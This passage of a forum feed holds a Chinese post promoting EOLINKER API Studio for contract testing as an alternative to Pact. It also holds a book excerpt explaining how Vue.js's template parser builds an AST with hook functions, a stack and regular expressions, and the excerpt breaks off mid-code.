class=\"markdown-text\"><h3>契约测试</h3>\n<p>为前后端对接的过程中会出现信息不对称，以及工作进度不一致的情况，因此希望通过事先约定好API返回数据的文档，根据文档来开发后端代码，以及生产可以被前端调用的虚拟的API，帮助前后端能够同时开展工作并且保持前后端代码的正确性，加快后期的系统集成测试甚至是取消系统集成测试。</p>\n<p>我们将以上的做法称之为契约测试。契约测试最开始的概念由 Martin Fowler 提出，它又被称之为：消费者驱动的契约测试（Consumer Driven Contracts），简称CDC。这里的契约是指软件系统中各个服务间交互的数据标准格式，更多的指消费端（client）和提供端（server）之间交互的API的格式。</p>\n<p>契约测试带来的变化主要是：</p>\n<ol>\n<li>将前后端测试解耦，前后端可以分别在对方还没有完成工作的时候就开展测试；</li>\n<li>将测试过程前移，加速或者取代集成测试；</li>\n<li>保证数据的一致性，让后端服务返回的数据就是前端想要得到的。</li>\n</ol>\n<p>我做了一张图方便大家理解CDC的概念：\n<img src=\"//static.cnodejs.org/Fo0W59jC5vVOD4YOcJ32B6Y1jeKs\" alt=\"1.png\"></p>\n<p>上图经历了三个步骤：</p>\n<ol>\n<li>消费者（广义的前端）根据业务需要编写好契约文件，契约文件里面编写了需要返回的数据；</li>\n<li>消费者（广义的前端）向契约文件（实际上是一个API服务）发起请求，得到预期的结果，验证前端业务逻辑是否正确；</li>\n<li>契约文件（实际上是一个API服务）向提供者（广义的后端）发起请求，得到后端真实的返回结果并且与契约文件中的数据规则进行校验，判断后端返回的数据是否满足契约的要求。如果无法通过校验，说明提供者的服务发生了改变，或者是没有按照契约所规定的来进行开发。</li>\n</ol>\n<p>如果通过了上面的三步，我们可以认为前后端对于契约的理解和实现是一致的，等到真正集成之后也不会出现问题。</p>\n<h3>Pact 契约测试框架</h3>\n<p>之前业内较为常见的做法是通过Pact（一个契约测试框架）进行契约测试：通过前端开发人员编写代码进行测试并生成Pact契约文件，后端通过Pact Brocker等服务管理契约以及调用等。</p>\n<p>但是Pact也存在一些缺点：</p>\n<ol>\n<li>需要引入Pact的相关文件以及正确搭建服务，用起来需要一定的时间成本</li>\n<li>生成的返回数据不够灵活，无法编写代码生成复杂的随机数据；</li>\n<li>无法判断请求参数来返回不同的结果；</li>\n<li>需要开发人员额外编写代码，增加了工作量；</li>\n<li>存在代码入侵的情况，并且目前支持的语言较少；</li>\n<li>模糊了开发与测试人员之间的界限，管理不当容易导致重复劳动；</li>\n</ol>\n<p>由于有以上的不足之处，Pact 在实际应用的效果往往并不理解。因此我们提出了通过 Mock API 以及测试用例实现更快速、更有效地契约测试。</p>\n<h3>通过 EOLINKER API Studio 实现契约测试</h3>\n<p>EOLINKER API Studio（<a href=\"https://s.growingio.com/gke2DD\">https://www.eolinker.com</a>） 提供了UI实现的 Mock API，配合API Studio 的测试用例与自动化测试，可以帮助研发团队更快速、更有效地实现契约测试。</p>\n<h4>什么是Mock API？</h4>\n<p>通过 Mock API，您可以事先编写好 API 的数据生成规则，由 API Studio 动态生成 API 的返回数据。开发人员通过访问 Mock API 的 URL 来获得所需要的数据，完成对接工作。</p>\n<p>在 API Studio中，同一个项目中的 Mock API 的地址前缀是相同的（<a href=\"http://xn--mock-f96g.eolinker.com/uasyd1/%E2%80%A6%EF%BC%89%EF%BC%8C%E5%9B%A0%E6%AD%A4%E5%8F%AF%E4%BB%A5%E5%9C%A8%E4%BB%A3%E7%A0%81%E4%B8%AD%E5%B0%86\">如mock.eolinker.com/uasyd1/…），因此可以在代码中将</a> Mock API 的地址前缀作为全局变量，项目上线时仅需替换变量的值即可改变整个项目的 API 请求地址前缀。</p>\n<p><img src=\"//static.cnodejs.org/FnK9GhoacAQ7f9UJE8-auwPmDplX\" alt=\"2.jpg\"></p>\n<h4>创建Mock API，实现前端的契约测试</h4>\n<p>在EOLINKER API Studio中，创建 Mock API 之前需要先创建API文档（或者导入Postman、Swagger等数据），API文档可以作为前后端对接的依据。这里我创建了一个简单的用户登录API文档：</p>\n<p><img src=\"//static.cnodejs.org/FqVi51Y2CvnNuce9LjIrkyV0atwR\" alt=\"3.jpg\"></p>\n<p>创建好API文档之后，点击 Mock API 标签进入Mock API的管理页面，在这里可以快速创建多个Mock API，并且根据不同的请求参数返回相应的数据：</p>\n<p><img src=\"//static.cnodejs.org/FtUpJN_bQ_uXNgSdaIGrLPvOQm2d\" alt=\"4.jpg\"></p>\n<p>创建一个 Mock API 期望，我们希望当传递user_name=123和user_psw=112233时，Mock Server返回登录成功的数据，这里返回的数据类型选择Json，填写好Json的格式以及内容即可：</p>\n<p><img src=\"//static.cnodejs.org/FpbtjZ63cXcfaYyGYQK8d3zTibju\" alt=\"5.jpg\"></p>\n<p>点击预览按钮可以看到是我们希望得到的返回数据，然后确定保存即可：</p>\n<p><img src=\"//static.cnodejs.org/FrRhBGeQXyIXXbNWsBqkVDfF939Y\" alt=\"6.jpg\"></p>\n<p>通过这种方式可以创建多个Mock API，并且通过请求红框处的 Mock API URL 得到返回结果：</p>\n<p><img src=\"//static.cnodejs.org/FkMLOYDcsRQif2QXi-Mlx6V3Jrx3\" alt=\"7.jpg\"></p>\n<p>API Studio 中也提供了强大的 API 测试的功能，我们直接在平台上对刚才的登录成功的 Mock API 发起请求，可以看到当我们传递正确的参数时，可以得到预期的返回结果，至此契约测试的前端契约就已经完成了：</p>\n<p><img src=\"//static.cnodejs.org/FnQyihoA1yqGiGw-JWW58QKI5Yjj\" alt=\"8.jpg\"></p>\n<h4>创建测试用例，实现后端的契约测试：</h4>\n<p>传统的契约测试其实并不能够保证测试的覆盖率，因为前端开发人员提供的契约文件很可能无法覆盖所有的请求情况，导致出现漏测的情况。</p>\n<p>因此 API Studio 建议将后端的契约测试交给测试人员负责，这样可以提供更完善的测试用例，并且可以结合各类CI工具实现自动化测试。</p>\n<p>由于 API Studio 基于 API 文档来实现契约测试、API用例测试、API自动化测试等功能，因此可以将前端、后端、测试人员解耦，工作的流程可以进一步改进为下图所示，前后端、测试人员可以同时开展工作，并且测试用例可以导入到自动化测试中成为长期的定时测试任务。</p>\n<p><img src=\"//static.cnodejs.org/FoxjwNMfI9IIEs7LFKKzCcA3AQAA\" alt=\"9.png\"></p>\n<p>由于测试用例与自动化测试所包含的内容较多，如有需要可以前往 EOLINKER API Studio 官方网站（<a href=\"http://www.eolinker.com/#/?ref=cnodejs\">https://www.eolinker.com</a>）或者是查阅 API Studio 帮助文档，在此不再赘述。</p>\n</div>","title":"为什么要抛弃Pact？如何快速实现契约测试（CDC）","last_reply_at":"2019-04-08T07:00:03.486Z","good":false,"top":false,"reply_count":0,"visit_count":484,"create_at":"2019-04-08T07:00:03.486Z","author":{"loginname":"wardennn","avatar_url":"https://avatars0.githubusercontent.com/u/33686934?v=4&s=120"}},{"id":"5caae462d68ff5064921ae7e","author_id":"541bf946ad60405c1f14b770","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文来自<a href=\"https://item.jd.com/12573168.html\">《深入浅出Vue.js》</a>模板编译原理篇的第九章，主要讲述了如何将模板解析成AST，这一章的内容是全书最复杂且烧脑的章节。本文未经排版，真实纸质书的排版会更加精致。</p>\n</blockquote>\n<p>通过第8章的学习，我们知道解析器在整个模板编译中的位置。我们只有将模板解析成AST后，才能基于AST做优化或者生成代码字符串，那么解析器是如何将模板解析成AST的呢？</p>\n<p>本章中，我们将详细介绍解析器内部的运行原理。</p>\n<h2>9.1 解析器的作用</h2>\n<p>解析器要实现的功能是将模板解析成AST。</p>\n<p>例如：</p>\n<pre class=\"prettyprint language-html\"><code>&lt;div&gt;\n  &lt;p&gt;{{name}}&lt;&#x2F;p&gt;\n&lt;&#x2F;div&gt;\n</code></pre><p>上面的代码是一个比较简单的模板，它转换成AST后的样子如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>{\n  tag: &quot;div&quot;\n  type: 1,\n  staticRoot: false,\n  static: false,\n  plain: true,\n  parent: undefined,\n  attrsList: [],\n  attrsMap: {},\n  children: [\n    {\n      tag: &quot;p&quot;\n      type: 1,\n      staticRoot: false,\n      static: false,\n      plain: true,\n      parent: {tag: &quot;div&quot;, ...},\n      attrsList: [],\n      attrsMap: {},\n      children: [{\n        type: 2,\n        text: &quot;{{name}}&quot;,\n        static: false,\n        expression: &quot;_s(name)&quot;\n      }]\n    }\n  ]\n}\n</code></pre><p>其实AST并不是什么很神奇的东西，不要被它的名字吓倒。它只是用JS中的对象来描述一个节点，一个对象代表一个节点，对象中的属性用来保存节点所需的各种数据。比如，<code>parent</code>属性保存了父节点的描述对象，<code>children</code>属性是一个数组，里面保存了一些子节点的描述对象。再比如，<code>type</code>属性代表一个节点的类型等。当很多个独立的节点通过<code>parent</code>属性和<code>children</code>属性连在一起时，就变成了一个树，而这样一个用对象描述的节点树其实就是AST。</p>\n<h2>9.2 解析器内部运行原理</h2>\n<p>事实上，解析器内部也分了好几个子解析器，比如HTML解析器、文本解析器以及过滤器解析器，其中最主要的是HTML解析器。顾名思义，HTML解析器的作用是解析HTML，它在解析HTML的过程中会不断触发各种钩子函数。这些钩子函数包括开始标签钩子函数、结束标签钩子函数、文本钩子函数以及注释钩子函数。</p>\n<p>伪代码如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>parseHTML(template, {\n    start (tag, attrs, unary) {\n        &#x2F;&#x2F; 每当解析到标签的开始位置时，触发该函数\n    },\n    end () {\n        &#x2F;&#x2F; 每当解析到标签的结束位置时，触发该函数\n    },\n    chars (text) {\n        &#x2F;&#x2F; 每当解析到文本时，触发该函数\n    },\n    comment (text) {\n        &#x2F;&#x2F; 每当解析到注释时，触发该函数\n    }\n})\n</code></pre><p>你可能不能很清晰地理解，下面我们举个简单的例子：</p>\n<pre class=\"prettyprint language-html\"><code>&lt;div&gt;&lt;p&gt;我是Berwin&lt;&#x2F;p&gt;&lt;&#x2F;div&gt;\n</code></pre><p>当上面这个模板被HTML解析器解析时，所触发的钩子函数依次是：<code>start</code>、<code>start</code>、<code>chars</code>、<code>end</code>、<code>end</code>。</p>\n<p>也就是说，解析器其实是从前向后解析的。解析到<code>&lt;div&gt;</code>时，会触发一个标签开始的钩子函数<code>start</code>；然后解析到<code>&lt;p&gt;</code>时，又触发一次钩子函数<code>start</code>；接着解析到<code>我是Berwin</code>这行文本，此时触发了文本钩子函数<code>chars</code>；然后解析到<code>&lt;/p&gt;</code>，触发了标签结束的钩子函数<code>end</code>；接着继续解析到<code>&lt;/div&gt;</code>，此时又触发一次标签结束的钩子函数<code>end</code>，解析结束。</p>\n<p>因此，我们可以在钩子函数中构建AST节点。在<code>start</code>钩子函数中构建元素类型的节点，在<code>chars</code>钩子函数中构建文本类型的节点，在<code>comment</code>钩子函数中构建注释类型的节点。</p>\n<p>当HTML解析器不再触发钩子函数时，就代表所有模板都解析完毕，所有类型的节点都在钩子函数中构建完成，即AST构建完成。</p>\n<p>我们发现，钩子函数<code>start</code>有三个参数，分别是<code>tag</code>、<code>attrs</code>和<code>unary</code>，它们分别代表标签名、标签的属性以及是否是自闭合标签。</p>\n<p>而文本节点的钩子函数<code>chars</code>和注释节点的钩子函数<code>comment</code>都只有一个参数，只有<code>text</code>。这是因为构建元素节点时需要知道标签名、属性和自闭合标识，而构建注释节点和文本节点时只需要知道文本即可。</p>\n<p>什么是自闭合标签？举个简单的例子，<code>input</code>标签就属于自闭合标签：<code>&lt;input type=&quot;text&quot; /&gt;</code>，而<code>div</code>标签就不属于自闭合标签：<code>&lt;div&gt;&lt;/div&gt;</code>。</p>\n<p>在<code>start</code>钩子函数中，我们可以使用这三个参数来构建一个元素类型的AST节点，例如：</p>\n<pre class=\"prettyprint language-javascript\"><code>function createASTElement (tag, attrs, parent) {\n    return {\n        type: 1,\n        tag,\n        attrsList: attrs,\n        parent,\n        children: []\n    }\n}\n\nparseHTML(template, {\n    start (tag, attrs, unary) {\n        let element = createASTElement(tag, attrs, currentParent)\n    }\n})\n</code></pre><p>在上面的代码中，我们在钩子函数<code>start</code>中构建了一个元素类型的AST节点。</p>\n<p>如果是触发了文本的钩子函数，就使用参数中的文本构建一个文本类型的AST节点，例如：</p>\n<pre class=\"prettyprint language-javascript\"><code>parseHTML(template, {\n    chars (text) {\n        let element = {type: 3, text}\n    }\n})\n</code></pre><p>如果是注释，就构建一个注释类型的AST节点，例如：</p>\n<pre class=\"prettyprint language-javascript\"><code>parseHTML(template, {\n    comment (text) {\n        let element = {type: 3, text, isComment: true}\n    }\n})\n</code></pre><p>你会发现，9.1节中看到的AST是有层级关系的，一个AST节点具有父节点和子节点，但是9.2节中介绍的创建节点的方式，节点是被拉平的，没有层级关系。因此，我们需要一套逻辑来实现层级关系，让每一个AST节点都能找到它的父级。下面我们介绍一下如何构建AST层级关系。</p>\n<p>构建AST层级关系其实非常简单，我们只需要维护一个栈（stack）即可，用栈来记录层级关系，这个层级关系也可以理解为DOM的深度。</p>\n<p>HTML解析器在解析HTML时，是从前向后解析。每当遇到<code>开始标签</code>，就触发钩子函数<code>start</code>。每当遇到<code>结束标签</code>，就会触发钩子函数<code>end</code>。</p>\n<p>基于HTML解析器的逻辑，我们可以在每次触发钩子函数<code>start</code>时，把当前构建的节点推入栈中；每当触发钩子函数<code>end</code>时，就从栈中弹出一个节点。</p>\n<p>这样就可以保证每当触发钩子函数<code>start</code>时，栈的最后一个节点就是当前正在构建的节点的父节点，如图9-1所示。</p>\n<p><img src=\"http://p7.qhimg.com/t016fc0c45c684b380c.jpg\" alt=\"栈\">\n图9-1 使用栈记录DOM层级关系（<strong>英文为代码体</strong>）</p>\n<p>下面我们用一个具体的例子来描述如何从0到1构建一个带层级关系的AST。</p>\n<p>假设有这样一个模板：</p>\n<pre class=\"prettyprint language-html\"><code>&lt;div&gt;\n    &lt;h1&gt;我是Berwin&lt;&#x2F;h1&gt;\n    &lt;p&gt;我今年23岁&lt;&#x2F;p&gt;\n&lt;&#x2F;div&gt;\n</code></pre><p>上面这个模板被解析成AST的过程如图9-2所示。</p>\n<p><img src=\"http://p3.qhimg.com/t01e3f773553bc714b8.jpg\" alt=\"构建AST的过程\"></p>\n<p>图9-2给出了构建AST的过程，图中的黑底白数字代表解析的步骤，具体如下。</p>\n<p>(1) 模板的开始位置是<code>div</code>的开始标签，于是会触发钩子函数<code>start</code>。<code>start</code>触发后，会先构建一个<code>div</code>节点。此时发现栈是空的，这说明<code>div</code>节点是根节点，因为它没有父节点。最后，将<code>div</code>节点推入栈中，并将模板字符串中的<code>div</code>开始标签从模板中截取掉。</p>\n<p>(2) 这时模板的开始位置是一些空格，这些空格会触发文本节点的钩子函数，在钩子函数里会忽略这些空格。同时会在模板中将这些空格截取掉。</p>\n<p>(3) 这时模板的开始位置是<code>h1</code>的开始标签，于是会触发钩子函数<code>start</code>。与前面流程一样，<code>start</code>触发后，会先构建一个<code>h1</code>节点。此时发现栈的最后一个节点是<code>div</code>节点，这说明<code>h1</code>节点的父节点是<code>div</code>，于是将<code>h1</code>添加到<code>div</code>的子节点中，并且将<code>h1</code>节点推入栈中，同时从模板中将<code>h1</code>的开始标签截取掉。</p>\n<p>(4) 这时模板的开始位置是一段文本，于是会触发钩子函数<code>chars</code>。<code>chars</code>触发后，会先构建一个文本节点，此时发现栈中的最后一个节点是<code>h1</code>，这说明文本节点的父节点是<code>h1</code>，于是将文本节点添加到<code>h1</code>节点的子节点中。由于文本节点没有子节点，所以文本节点不会被推入栈中。最后，将文本从模板中截取掉。</p>\n<p>(5) 这时模板的开始位置是<code>h1</code>结束标签，于是会触发钩子函数<code>end</code>。<code>end</code>触发后，会把栈中最后一个节点弹出来。</p>\n<p>(6) 与第(2)步一样，这时模板的开始位置是一些空格，这些空格会触发文本节点的钩子函数，在钩子函数里会忽略这些空格。同时会在模板中将这些空格截取掉。</p>\n<p>(7) 这时模板的开始位置是<code>p</code>开始标签，于是会触发钩子函数<code>start</code>。<code>start</code>触发后，会先构建一个<code>p</code>节点。由于第(5)步已经从栈中弹出了一个节点，所以此时栈中的最后一个节点是<code>div</code>，这说明<code>p</code>节点的父节点是<code>div</code>。于是将<code>p</code>推入<code>div</code>的子节点中，最后将<code>p</code>推入到栈中，并将<code>p</code>的开始标签从模板中截取掉。</p>\n<p>(8) 这时模板的开始位置又是一段文本，于是会触发钩子函数<code>chars</code>。当<code>chars</code>触发后，会先构建一个文本节点，此时发现栈中的最后一个节点是<code>p</code>节点，这说明文本节点的父节点是<code>p</code>节点。于是将文本节点推入<code>p</code>节点的子节点中，并将文本从模板中截取掉。</p>\n<p>(9) 这时模板的开始位置是<code>p</code>的结束标签，于是会触发钩子函数<code>end</code>。当<code>end</code>触发后，会从栈中弹出一个节点出来，也就是把<code>p</code>标签从栈中弹出来，并将<code>p</code>的结束标签从模板中截取掉。</p>\n<p>(10) 与第(2)步和第(6)步一样，这时模板的开始位置是一些空格，这些空格会触发文本节点的钩子函数并且在钩子函数里会忽略这些空格。同时会在模板中将这些空格截取掉。</p>\n<p>(11) 这时模板的开始位置是<code>div</code>的结束标签，于是会触发钩子函数<code>end</code>。其逻辑与之前一样，把栈中的最后一个节点弹出来，也就是把<code>div</code>弹了出来，并将<code>div</code>的结束标签从模板中截取掉。</p>\n<p>(12)这时模板已经被截取空了，也就代表着HTML解析器已经运行完毕。这时我们会发现栈已经空了，但是我们得到了一个完整的带层级关系的AST语法树。这个AST中清晰写明了每个节点的父节点、子节点及其节点类型。</p>\n<h2>9.3 HTML解析器</h2>\n<p>通过前面的介绍，我们发现构建AST非常依赖HTML解析器所执行的钩子函数以及钩子函数中所提供的参数，你一定会非常好奇HTML解析器是如何解析模板的，接下来我们会详细介绍HTML解析器的运行原理。</p>\n<h3>9.3.1 运行原理</h3>\n<p>事实上，解析HTML模板的过程就是循环的过程，简单来说就是用HTML模板字符串来循环，每轮循环都从HTML模板中截取一小段字符串，然后重复以上过程，直到HTML模板被截成一个空字符串时结束循环，解析完毕，如图9-2所示。</p>\n<p>在截取一小段字符串时，有可能截取到开始标签，也有可能截取到结束标签，又或者是文本或者注释，我们可以根据截取的字符串的类型来触发不同的钩子函数。</p>\n<p>循环HTML模板的伪代码如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>function parseHTML(html, options) {\n  while (html) {\n    &#x2F;&#x2F; 截取模板字符串并触发钩子函数\n  }\n}\n</code></pre><p>为了方便理解，我们手动模拟HTML解析器的解析过程。例如，下面这样一个简单的HTML模板：</p>\n<pre class=\"prettyprint language-html\"><code>&lt;div&gt;\n  &lt;p&gt;{{name}}&lt;&#x2F;p&gt;\n&lt;&#x2F;div&gt;\n</code></pre><p>它在被HTML解析器解析的过程如下。</p>\n<p>最初的HTML模板：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#96;&lt;div&gt;\n  &lt;p&gt;{{name}}&lt;&#x2F;p&gt;\n&lt;&#x2F;div&gt;&#96;\n</code></pre><p>第一轮循环时，截取出一段字符串<code>&lt;div&gt;</code>，并且触发钩子函数<code>start</code>，截取后的结果为：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#96;\n  &lt;p&gt;{{name}}&lt;&#x2F;p&gt;\n&lt;&#x2F;div&gt;&#96;\n</code></pre><p>第二轮循环时，截取出一段字符串：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#96;\n  &#96;\n</code></pre><p>并且触发钩子函数<code>chars</code>，截取后的结果为：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#96;&lt;p&gt;{{name}}&lt;&#x2F;p&gt;\n&lt;&#x2F;div&gt;&#96;\n</code></pre><p>第三轮循环时，截取出一段字符串<code>&lt;p&gt;</code>，并且触发钩子函数<code>start</code>，截取后的结果为：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#96;{{name}}&lt;&#x2F;p&gt;\n&lt;&#x2F;div&gt;&#96;\n</code></pre><p>第四轮循环时，截取出一段字符串<code>{{name}}</code>，并且触发钩子函数<code>chars</code>，截取后的结果为：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#96;&lt;&#x2F;p&gt;\n&lt;&#x2F;div&gt;&#96;\n</code></pre><p>第五轮循环时，截取出一段字符串<code>&lt;/p&gt;</code>，并且触发钩子函数<code>end</code>，截取后的结果为：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#96;\n&lt;&#x2F;div&gt;&#96;\n</code></pre><p>第六轮循环时，截取出一段字符串：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#96;\n&#96;\n</code></pre><p>并且触发钩子函数<code>chars</code>，截取后的结果为：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#96;&lt;&#x2F;div&gt;&#96;\n</code></pre><p>第七轮循环时，截取出一段字符串<code>&lt;/div&gt;</code>，并且触发钩子函数<code>end</code>，截取后的结果为：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#96;&#96;\n</code></pre><p>解析完毕。</p>\n<p>HTML解析器的全部逻辑都是在循环中执行，循环结束就代表解析结束。接下来，我们要讨论的重点是HTML解析器在循环中都干了些什么事。</p>\n<p>你会发现HTML解析器可以很聪明地知道它在每一轮循环中应该截取哪些字符串，那么它是如何做到这一点的呢？</p>\n<p>通过前面的例子，我们发现一个很有趣的事，那就是每一轮截取字符串时，都是在整个模板的开始位置截取。我们根据模板开始位置的片段类型，进行不同的截取操作。</p>\n<blockquote>\n<p>例如，上面例子中的第一轮循环：如果是以开始标签开头的模板，就把开始标签截取掉。</p>\n<p>再例如，上面例子中的第四轮循环：如果是以文本开始的模板，就把文本截取掉。</p>\n</blockquote>\n<p>这些被截取的片段分很多种类型，示例如下。</p>\n<ul>\n<li>开始标签，例如<code>&lt;div&gt;</code>。</li>\n<li>结束标签，例如<code>&lt;/div&gt;</code>。</li>\n<li>HTML注释，例如<code>&lt;!-- 我是注释 --&gt;</code>。</li>\n<li>DOCTYPE，例如<code>&lt;!DOCTYPE html&gt;</code>。</li>\n<li>条件注释，例如<code>&lt;!--[if !IE]&gt;--&gt;我是注释&lt;!--&lt;![endif]--&gt;</code>。</li>\n<li>文本，例如<code>我是Berwin</code>。</li>\n</ul>\n<p>通常，最常见的是开始标签、结束标签、文本以及注释。</p>\n<h3>9.3.2 截取开始标签</h3>\n<p>上一节中我们说过，每一轮循环都是从模板的最前面截取，所以只有模板以开始标签开头，才需要进行开始标签的截取操作。</p>\n<p>那么，如何确定模板是不是以开始标签开头？</p>\n<p>在HTML解析器中，想分辨出模板是否以开始标签开头并不难，我们需要先判断HTML模板是不是以<code>&lt;</code>开头。</p>\n<p>如果HTML模板的第一个字符不是<code>&lt;</code>，那么它一定不是以开始标签开头的模板，所以不需要进行开始标签的截取操作。</p>\n<p>如果HTML模板以<code>&lt;</code>开头，那么说明它至少是一个以标签开头的模板，但这个标签到底是什么类型的标签，还需要进一步确认。</p>\n<p>如果模板以<code>&lt;</code>开头，那么它有可能是以开始标签开头的模板，同时它也有可能是以结束标签开头的模板，还有可能是注释等其他标签，因为这些类型的片段都以<code>&lt;</code>开头。那么，要进一步确定模板是不是以开始标签开头，还需要借助正则表达式来分辨模板的开始位置是否符合开始标签的特征。</p>\n<p>那么，如何使用正则表达式来匹配模板以开始标签开头？我们看下面的代码：</p>\n<pre class=\"prettyprint language-javascript\"><code>const ncname = &#x27;[a-zA-Z_][\\\\w\\\\-\\\\.]*&#x27;\nconst qnameCapture = &#96;((?:${ncname}\\\\:)?${ncname})&#96;\nconst startTagOpen = new RegExp(&#96;^&lt;${qnameCapture}&#96;)\n\n&#x2F;&#x2F; 以开始标签开始的模板\n&#x27;&lt;div&gt;&lt;&#x2F;div&gt;&#x27;.match(startTagOpen) &#x2F;&#x2F; [&quot;&lt;div&quot;, &quot;div&quot;, index: 0, input: &quot;&lt;div&gt;&lt;&#x2F;div&gt;&quot;]\n\n&#x2F;&#x2F; 以结束标签开始的模板\n&#x27;&lt;&#x2F;div&gt;&lt;div&gt;我是Berwin&lt;&#x2F;div&gt;&#x27;.match(startTagOpen) &#x2F;&#x2F; null\n\n&#x2F;&#x2F; 以文本开始的模板\n&#x27;我是Berwin&lt;&#x2F;p&gt;&#x27;.match(startTagOpen) &#x2F;&#x2F; null\n</code></pre><p>通过上面的例子可以看到，只有<code>'&lt;div&gt;&lt;/div&gt;'</code>可以成功匹配，而以<code>&lt;/div&gt;</code>开头的或者以文本开头的模板都无法成功匹配。</p>\n<p>在9.2节中，我们介绍了当HTML解析器解析到标签开始时，会触发钩子函数<code>start</code>，同时会给出三个参数，分别是标签名（<code>tagName</code>）、属性（<code>attrs</code>）以及自闭合标识（<code>unary</code>）。</p>\n<p>因此，在分辨出模板以开始标签开始之后，需要将标签名、属性以及自闭合标识解析出来。</p>\n<p>在分辨模板是否以开始标签开始时，就可以得到标签名，而属性和自闭合标识则需要进一步解析。</p>\n<p>当完成上面的解析后，我们可以得到这样一个数据结构：</p>\n<pre class=\"prettyprint language-javascript\"><code>const start = &#x27;&lt;div&gt;&lt;&#x2F;div&gt;&#x27;.match(startTagOpen)\nif (start) {\n    const match = {\n        tagName: start[1],\n        attrs: []\n    }\n}\n</code></pre><p>这里有一个细节很重要：在前面的例子中，我们匹配到的开始标签并不全。例如：</p>\n<pre class=\"prettyprint language-javascript\"><code>const ncname = &#x27;[a-zA-Z_][\\\\w\\\\-\\\\.]*&#x27;\nconst qnameCapture = &#96;((?:${ncname}\\\\:)?${ncname})&#96;\nconst startTagOpen = new RegExp(&#96;^&lt;${qnameCapture}&#96;)\n\n&#x27;&lt;div&gt;&lt;&#x2F;div&gt;&#x27;.match(startTagOpen)\n&#x2F;&#x2F; [&quot;&lt;div&quot;, &quot;div&quot;, index: 0, input: &quot;&lt;div&gt;&lt;&#x2F;div&gt;&quot;]\n\n&#x27;&lt;p&gt;&lt;&#x2F;p&gt;&#x27;.match(startTagOpen)\n&#x2F;&#x2F; [&quot;&lt;p&quot;, &quot;p&quot;, index: 0, input: &quot;&lt;p&gt;&lt;&#x2F;p&gt;&quot;]\n\n&#x27;&lt;div class=&quot;box&quot;&gt;&lt;&#x2F;div&gt;&#x27;.match(startTagOpen)\n&#x2F;&#x2F; [&quot;&lt;div&quot;, &quot;div&quot;, index: 0, input: &quot;&lt;div class=&quot;box&quot;&gt;&lt;&#x2F;div&gt;&quot;]\n</code></pre><p>可以看出，上面这个正则表达式虽然可以分辨出模板是否以开始标签开头，但是它的匹配规则并不是匹配整个开始标签，而是开始标签的一小部分。</p>\n<p>事实上，开始标签被拆分成三个小部分，分别是标签名、属性和结尾，如图9-3所示。</p>\n<p><img src=\"https://p0.ssl.qhimg.com/t01d15917c94d5a34bf.jpg\" alt=\"开始标签的三个小部分\">\n图9-3 开始标签被拆分成三个小部分（<strong>代码用代码体</strong>）</p>\n<p>通过“标签名”这一段字符，就可以分辨出模板是否以开始标签开头，此后要想得到属性和自闭合标识，则需要进一步解析。</p>\n<h4>1. 解析标签属性</h4>\n<p>在分辨模板是否以开始标签开头时，会将开始标签中的标签名这一小部分截取掉，因此在解析标签属性时，我们得到的模板是下面伪代码中的样子：</p>\n<pre class=\"prettyprint language-html\"><code>&#x27; class=&quot;box&quot;&gt;&lt;&#x2F;div&gt;&#x27;\n</code></pre><p>通常，标签属性是可选的，一个标签的属性有可能存在，也有可能不存在，所以需要判断标签是否存在属性，如果存在，对它进行截取。</p>\n<p>下面的伪代码展示了如何解析开始标签中的属性，但是它只能解析一个属性：</p>\n<pre class=\"prettyprint language-javascript\"><code>const attribute = &#x2F;^\\s*([^\\s&quot;&#x27;&lt;&gt;\\&#x2F;=]+)(?:\\s*(=)\\s*(?:&quot;([^&quot;]*)&quot;+|&#x27;([^&#x27;]*)&#x27;+|([^\\s&quot;&#x27;=&lt;&gt;&#96;]+)))?&#x2F;\nlet html = &#x27; class=&quot;box&quot;&gt;&lt;&#x2F;div&gt;&#x27;\nlet attr = html.match(attribute)\nhtml = html.substring(attr[0].length)\nconsole.log(attr)\n&#x2F;&#x2F; [&#x27; class=&quot;box&quot;&#x27;, &#x27;class&#x27;, &#x27;=&#x27;, &#x27;box&#x27;, undefined, undefined, index: 0, input: &#x27; class=&quot;box&quot;&gt;&lt;&#x2F;div&gt;&#x27;]\n</code></pre><p>如果标签上有很多属性，那么上面的处理方式就不足以支撑解析任务的正常运行。例如下面的代码：</p>\n<pre class=\"prettyprint language-javascript\"><code>const attribute = &#x2F;^\\s*([^\\s&quot;&#x27;&lt;&gt;\\&#x2F;=]+)(?:\\s*(=)\\s*(?:&quot;([^&quot;]*)&quot;+|&#x27;([^&#x27;]*)&#x27;+|([^\\s&quot;&#x27;=&lt;&gt;&#96;]+)))?&#x2F;\nlet html = &#x27; class=&quot;box&quot; id=&quot;el&quot;&gt;&lt;&#x2F;div&gt;&#x27;\nlet attr = html.match(attribute)\nhtml = html.substring(attr[0].length)\nconsole.log(attr)\n&#x2F;&#x2F; [&#x27; class=&quot;box&quot;&#x27;, &#x27;class&#x27;, &#x27;=&#x27;, &#x27;box&#x27;, undefined, undefined, index: 0, input: &#x27; class=&quot;box&quot; id=&quot;el&quot;&gt;&lt;&#x2F;div&gt;&#x27;]\n</code></pre><p>可以看到，这里只解析出了<code>class</code>属性，而<code>id</code>属性没有解析出来。</p>\n<p>此时剩余的HTML模板是这样的：</p>\n<pre class=\"prettyprint language-html\"><code>&#x27; id=&quot;el&quot;&gt;&lt;&#x2F;div&gt;&#x27;\n</code></pre><p>所以属性也可以分成多个小部分，一小部分一小部分去解析与截取。</p>\n<p>解决这个问题时，我们只需要每解析一个属性就截取一个属性。如果截取完后，剩下的HTML模板依然符合标签属性的正则表达式，那么说明还有剩余的属性需要处理，此时就重复执行前面的流程，直到剩余的模板不存在属性，也就是剩余的模板不存在符合正则表达式所预设的规则。</p>\n<p>例如：</p>\n<pre class=\"prettyprint language-javascript\"><code>const startTagClose = &#x2F;^\\s*(\\&#x2F;?)&gt;&#x2F;\nconst attribute = 